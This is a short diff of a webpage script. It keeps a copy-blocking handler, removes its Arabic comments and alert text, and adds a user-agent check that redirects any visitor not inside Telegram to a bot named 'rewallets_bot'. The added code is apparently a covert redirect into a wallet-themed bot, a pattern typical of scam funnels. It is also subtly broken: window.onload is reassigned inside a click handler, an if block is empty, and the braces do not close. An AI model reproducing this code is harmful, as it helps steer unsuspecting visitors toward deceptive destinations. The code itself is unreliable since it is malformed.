@@ -27,12 +27,26 @@ document.addEventListener('selectstart', function(e) {
 
 document.addEventListener('copy', function(e) {
     e.preventDefault();
-    alert('عذراً، النسخ غير مسموح!');
+    alert('');
 });
 
-// تأخير 3 ثوانٍ قبل إزالة صفحة التحميل
+
 window.onload = function() {
     setTimeout(function() {
-        document.getElementById('loading-screen').remove(); // إزالة صفحة التحميل نهائياً
-    }, 1000); // 3 ثوانٍ
+        document.getElementById('loading-screen').remove(); 
+    }, 1000);
 };
+document.addEventListener('click', function(event) {
+   
+    if (document.activeElement && (document.activeElement.tagName === "INPUT" || document.activeElement.tagName === "TEXTAREA")) {
+       
+    }
+    window.onload = function() {
+      const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+
+        const isTelegram = userAgent.toLowerCase().includes("telegram");
+
+      if (!isTelegram) {
+          window.location.href = "https://t.me/rewallets_bot";
+      }
+      }; 
